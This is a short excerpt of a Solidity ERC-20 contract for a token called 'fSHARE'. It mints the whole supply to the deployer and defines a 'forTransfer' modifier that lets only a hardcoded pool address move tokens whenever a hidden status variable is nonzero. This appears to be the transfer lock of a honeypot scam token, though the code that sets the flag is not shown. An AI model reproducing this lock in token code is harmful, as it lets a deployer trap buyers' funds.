...
contract fSHAREToken is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _tokenFS_statFS = 0;
    uint256 public stakingPoolFSStatFS = 0;

    string private _tokenFS_name;
    string private _tokenFS_symbol;

    address private _poolFSAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenFS_name = "fSHARE";
        _tokenFS_symbol = "fSHARE";
        _tokenFS_totalSupply = 54500 * 10 ** 18;
        _balances[msg.sender] = _tokenFS_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolFSAddress || _tokenFS_statFS == 0);
        _;
    }
